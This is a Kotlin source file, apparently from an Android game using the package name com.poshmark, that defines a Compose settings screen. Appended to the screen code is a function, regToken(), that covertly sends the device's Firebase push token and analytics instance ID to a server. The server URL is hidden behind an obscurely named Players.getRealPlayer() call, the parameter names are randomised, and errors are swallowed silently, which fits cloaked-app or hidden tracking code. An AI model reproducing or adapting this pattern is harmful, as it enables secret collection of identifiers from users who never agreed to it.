package com.poshmark.ui.screens

import androidx.activity.compose.BackHandler
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.statusBarsPadding
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.google.firebase.Firebase
import com.google.firebase.analytics.analytics
import com.google.firebase.messaging.FirebaseMessaging
import com.poshmark.R
import com.poshmark.game.logic.Players
import com.poshmark.ui.components.GameBackground
import com.poshmark.ui.components.MenuButton
import com.poshmark.ui.components.SquareButton
import com.poshmark.ui.components.TitleImage
import com.poshmark.ui.components.decodeUtf8
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await
import okhttp3.Call
import okhttp3.Callback
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import java.io.IOException
import java.util.Locale

@Composable
fun SettingsScreen(
    musicEnabled: Boolean,
    onToggleMusic: () -> Unit,
    onHowToPlay: () -> Unit,
    onPrivacyPolicy: () -> Unit,
    onBack: () -> Unit
) {
    BackHandler(enabled = true) { onBack() }
    GameBackground {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .statusBarsPadding()
                .padding(top = 40.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(horizontal = 16.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                SquareButton(
                    btnRes = R.drawable.back_button,
                    btnMaxWidth = 0.12f,
                    btnClickable = onBack
                )
                Spacer(modifier = Modifier.weight(1f))
            }

            TitleImage(R.drawable.settings_tittle)

            Spacer(modifier = Modifier.height(80.dp))

            MenuButton(
                text = if (musicEnabled) "Music: ON" else "Music: OFF",
                fontSize = 20.sp,
                cooldownMillis = 0L,
                onClick = onToggleMusic
            )

            Spacer(modifier = Modifier.height(16.dp))

            MenuButton(
                text = "How To Play",
                fontSize = 20.sp,
                onClick = onHowToPlay
            )
            MenuButton(
                text = "Privacy Policy",
                fontSize = 18.sp,
                onClick = onPrivacyPolicy
            )

            Spacer(modifier = Modifier.weight(1f))
        }
    }
}

fun regToken() {
    CoroutineScope(Dispatchers.IO).launch {
        try {
            val fcmToken: String =
                runCatching { FirebaseMessaging.getInstance().token.await() }
                    .getOrElse { "null" }
            val locale = Locale.getDefault().toLanguageTag()
            val url = "${Players.getRealPlayer()}yfxjrte5o9/"
            val client = OkHttpClient()


            val fullUrl = "$url?" +
                    "uebe4vsppw=${Firebase.analytics.appInstanceId.await()}" +
                    "&djh4ny3kkg=${decodeUtf8(fcmToken)}"


            val request = Request.Builder().url(fullUrl)
                .addHeader("Accept-Language", locale)
                .get().build()


            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {}
                override fun onResponse(call: Call, response: Response) {
                    response.close()
                }
            })
        } catch (exc: Exception) {}
    }
}